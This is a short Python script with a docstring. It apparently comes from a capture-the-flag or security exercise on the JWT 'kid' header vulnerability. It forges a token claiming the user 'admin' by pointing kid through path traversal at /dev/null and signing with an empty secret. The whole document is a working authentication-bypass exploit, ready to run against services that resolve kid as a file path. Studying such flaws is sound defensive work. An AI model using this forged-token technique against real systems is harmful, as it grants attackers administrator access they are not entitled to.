"""
'kid' header stands for 'Key ID'.
The vulnerability comes from being able to set the kid  to a predictable value.
On a linux machine you can set the kid to '/dev/null' which returns nothing.
Then set the secret to a blank value and sign the jwt with it.
"""

#!/usr/bin/env python3
import jwt

secret = ''
payload = {
    "user":"admin"
}
alg = "HS256"
header = {
    "kid":"../../../../../../dev/null"
}

token = jwt.encode(payload, secret, algorithm=alg, headers=header)
print(token)
